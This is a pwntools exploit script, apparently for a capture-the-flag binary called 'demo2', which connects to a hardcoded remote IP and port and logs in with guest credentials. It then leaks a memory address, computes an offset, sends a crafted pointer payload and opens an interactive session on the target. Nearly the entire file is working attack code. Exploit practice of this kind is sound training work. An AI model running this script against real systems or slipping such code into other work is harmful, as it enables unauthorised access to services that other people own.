#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./demo2 --host 127.0.0.1 --port 1234
from pwn import *
from struct import unpack
import random, time
import re
from math import sqrt

# Set up pwntools for the correct architecture

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11726)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments
io = start()
io.recvuntil(b'login:')
io.sendline(b'guest')
io.recvuntil(b'password')
io.sendline(b'123456')
io.recvuntil(b'>')
io.sendline('322424845')
io.recvuntil(b":")
io.sendline('1')
io.recvuntil(b'>')
io.sendline('3')
io.recvuntil(b'1) ')
r = io.recvuntil(b'\n')
print(r)
r = r[1:-1]+2*b'\x00'
offset = u64(r)-0xa2a+0xc10
io.sendline('4')
io.recvuntil(b':')
io.sendline(b'b'+p64(offset))
io.recvuntil(b":")
io.sendline('a')
io.recvuntil(b'>')
io.sendline('322424845')
io.recvuntil(b":")
io.sendline('2')
io.recvuntil(b'>')
io.interactive()